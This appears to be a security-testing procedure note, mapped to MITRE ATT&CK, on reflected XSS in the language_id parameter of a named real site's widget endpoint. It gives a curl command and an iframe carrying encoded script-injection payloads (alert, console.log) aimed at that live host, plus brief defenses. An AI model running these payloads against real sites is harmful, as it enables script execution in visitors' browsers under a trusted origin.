---
tags:
  - xss
  - payload-injection
  - reflected-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
sub_techniques: []
id: 4c5b1492-a872-43d6-a5bd-b39a6ccb7c8f
created_at: '2025-12-14T03:15:26.575Z'
updated_at: '2025-12-14T03:15:26.575Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Test-Reflected-XSS-in-Language-ID-Parameter

## Summary

This procedure tests the language_id parameter in Zomato's o2.php endpoint for reflected XSS vulnerabilities using crafted JavaScript payloads.

## Description

Similar to the city_id issue, language_id lacks proper filtering, allowing injection of closing quotes and script tags that execute in the widget context. This can lead to console logging, alerts, or more malicious actions when the widget is loaded, exploiting the trusted zomato.com origin.

## Requirements

1. Endpoint accessibility
2. Payload encoding tools
3. Developer console for log verification

## Defense

Defensive measures and detection strategies:

- Restrict language_id to predefined values
- Encode outputs to prevent script injection
- Use CSP headers to restrict script sources
- Anomaly detection on parameter values

## Objectives

1. Validate input reflection without sanitization
2. Confirm multi-payload execution (alert and log)
3. Evaluate exploitation potential

## Instructions

### Step 1: Inject Payload

**Context**: Send encoded payload to trigger reflection.

**Command** ([[commands/curl-test-xss-payload]]):
```bash
curl "https://www.zomato.com/widgets/o2.php?language_id=%22}%27%29;alert%28document.domain%29;console.log%28%27XSS%27%29 -o response.html
```

> Check response for payload; open in browser to see alert and console.log('XSS').

### Step 2: Test in Context

**Context**: Simulate embedding.

HTML iframe:
```html
<iframe src="https://www.zomato.com/widgets/o2.php?language_id=%22%3E%3Cscript%3Econsole.log%28%27XSS%27%29%3C/script%3E"></iframe>
```

> Verify log in console.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-xss-payload]]

## Tools Used


## Tags

- xss-test
- language-id-injection
